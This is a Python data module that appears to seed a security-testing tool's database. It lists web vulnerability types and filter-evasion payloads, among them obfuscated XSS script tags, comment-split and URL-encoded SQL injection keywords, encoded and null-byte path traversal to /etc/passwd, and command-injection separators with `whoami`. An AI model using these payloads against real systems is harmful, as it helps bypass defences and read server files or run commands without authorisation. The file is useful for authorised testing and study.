"""
Initial payload data for populating the database.
Contains example payloads for major vulnerability types.
"""

VULNERABILITY_TYPES = [
    {
        'name': 'XSS',
        'description': 'Cross-Site Scripting - Injection of malicious scripts into web pages',
        'category': 'injection',
        'severity': 'high',
    },
    {
        'name': 'SQLi',
        'description': 'SQL Injection - Injection of malicious SQL code into database queries',
        'category': 'injection',
        'severity': 'critical',
    },
    {
        'name': 'LFI',
        'description': 'Local File Inclusion - Reading local files on the server',
        'category': 'file_inclusion',
        'severity': 'high',
    },
    {
        'name': 'RFI',
        'description': 'Remote File Inclusion - Including remote files in application',
        'category': 'file_inclusion',
        'severity': 'critical',
    },
    {
        'name': 'RCE',
        'description': 'Remote Code Execution - Execute arbitrary code on the server',
        'category': 'code_execution',
        'severity': 'critical',
    },
    {
        'name': 'CSRF',
        'description': 'Cross-Site Request Forgery - Unauthorized commands from trusted user',
        'category': 'authorization',
        'severity': 'medium',
    },
    {
        'name': 'XXE',
        'description': 'XML External Entity - Processing of external entities in XML',
        'category': 'injection',
        'severity': 'high',
    },
    {
        'name': 'SSRF',
        'description': 'Server-Side Request Forgery - Making requests from server-side',
        'category': 'misconfiguration',
        'severity': 'high',
    },
    {
        'name': 'Path Traversal',
        'description': 'Directory Traversal - Access files outside web root',
        'category': 'file_inclusion',
        'severity': 'medium',
    },
    {
        'name': 'Command Injection',
        'description': 'OS Command Injection - Execute system commands',
        'category': 'code_execution',
        'severity': 'critical',
    },
]

from manipulator.payloads import PAYLOADS


MANIPULATION_TRICKS = {
    'XSS': [
        {
            'name': 'Case Variation',
            'technique': '<ScRiPt>alert(1)</ScRiPt>',
            'description': 'Use mixed case to bypass case-sensitive filters',
            'effectiveness': 'medium',
            'target_defense': 'Case-sensitive filters',
            'example': '<ScRiPt> instead of <script>',
        },
        {
            'name': 'HTML Entity Encoding',
            'technique': '&#60;script&#62;alert(1)&#60;/script&#62;',
            'description': 'Use HTML entities to encode characters',
            'effectiveness': 'high',
            'target_defense': 'Simple string matching',
            'example': '&#60; for <',
        },
        {
            'name': 'Null Byte Injection',
            'technique': '<scri\x00pt>alert(1)</script>',
            'description': 'Insert null bytes to bypass filters',
            'effectiveness': 'low',
            'target_defense': 'String matching filters',
            'example': 'Add \x00 in middle of keywords',
        },
    ],
    'SQLi': [
        {
            'name': 'Comment Bypass',
            'technique': 'UN/**/ION SEL/**/ECT',
            'description': 'Use SQL comments to break up keywords',
            'effectiveness': 'high',
            'target_defense': 'Keyword blacklists',
            'example': 'UN/**/ION instead of UNION',
        },
        {
            'name': 'Case Variation',
            'technique': 'UnIoN sElEcT',
            'description': 'Mix case in SQL keywords',
            'effectiveness': 'medium',
            'target_defense': 'Case-sensitive filters',
            'example': 'UnIoN instead of UNION',
        },
        {
            'name': 'URL Encoding',
            'technique': '%55%4E%49%4F%4E',
            'description': 'URL encode SQL keywords',
            'effectiveness': 'high',
            'target_defense': 'WAF bypass',
            'example': '%55%4E%49%4F%4E for UNION',
        },
    ],
    'LFI': [
        {
            'name': 'URL Encoding',
            'technique': '..%2f..%2fetc%2fpasswd',
            'description': 'URL encode path separators',
            'effectiveness': 'high',
            'target_defense': 'Path validation',
            'example': '%2f for /',
        },
        {
            'name': 'Double URL Encoding',
            'technique': '..%252f..%252fetc%252fpasswd',
            'description': 'Double URL encode for bypass',
            'effectiveness': 'high',
            'target_defense': 'Double decoding systems',
            'example': '%252f for %2f',
        },
        {
            'name': 'Null Byte',
            'technique': '../../../etc/passwd%00',
            'description': 'Use null byte to truncate extension',
            'effectiveness': 'medium',
            'target_defense': 'Extension checks',
            'example': 'Add %00 at end',
        },
    ],
    'Path Traversal': [
        {
            'name': 'Alternative Separators',
            'technique': '..\\..\\..\\etc\\passwd',
            'description': 'Use backslashes on Windows or mixed separators',
            'effectiveness': 'medium',
            'target_defense': 'Forward slash filters',
            'example': '\\ instead of /',
        },
        {
            'name': 'Absolute Path',
            'technique': '/etc/passwd',
            'description': 'Use absolute path if relative is blocked',
            'effectiveness': 'low',
            'target_defense': 'Relative path checks',
            'example': '/etc/passwd directly',
        },
    ],
    'Command Injection': [
        {
            'name': 'Alternative Separators',
            'technique': '|, ||, &, &&, ;, \n',
            'description': 'Try different command separators',
            'effectiveness': 'high',
            'target_defense': 'Semicolon filters',
            'example': 'Use | instead of ;',
        },
        {
            'name': 'Inline Execution',
            'technique': '`whoami` or $(whoami)',
            'description': 'Use command substitution',
            'effectiveness': 'high',
            'target_defense': 'Basic command filters',
            'example': '`whoami` for inline execution',
        },
    ],
}

ENCODING_TECHNIQUES = [
    {
        'name': 'URL Encoding',
        'description': 'Encode special characters as %XX hexadecimal',
        'encoding_type': 'url',
        'is_reversible': True,
    },
    {
        'name': 'Double URL Encoding',
        'description': 'Apply URL encoding twice for double-decoding systems',
        'encoding_type': 'url',
        'is_reversible': True,
    },
    {
        'name': 'Base64',
        'description': 'Encode to Base64 format',
        'encoding_type': 'base64',
        'is_reversible': True,
    },
    {
        'name': 'Hexadecimal',
        'description': 'Convert to hexadecimal representation',
        'encoding_type': 'hex',
        'is_reversible': True,
    },
    {
        'name': 'Unicode Escape',
        'description': 'Encode as Unicode escape sequences',
        'encoding_type': 'unicode',
        'is_reversible': True,
    },
    {
        'name': 'HTML Entity',
        'description': 'Encode as HTML entities',
        'encoding_type': 'html',
        'is_reversible': True,
    },
    {
        'name': 'HTML Numeric Entity',
        'description': 'Encode as HTML numeric entities (&#XX;)',
        'encoding_type': 'html',
        'is_reversible': True,
    },
    {
        'name': 'Octal',
        'description': 'Encode as octal escape sequences',
        'encoding_type': 'octal',
        'is_reversible': True,
    },
    {
        'name': 'ROT13',
        'description': 'Simple Caesar cipher rotation by 13',
        'encoding_type': 'substitution',
        'is_reversible': True,
    },
]
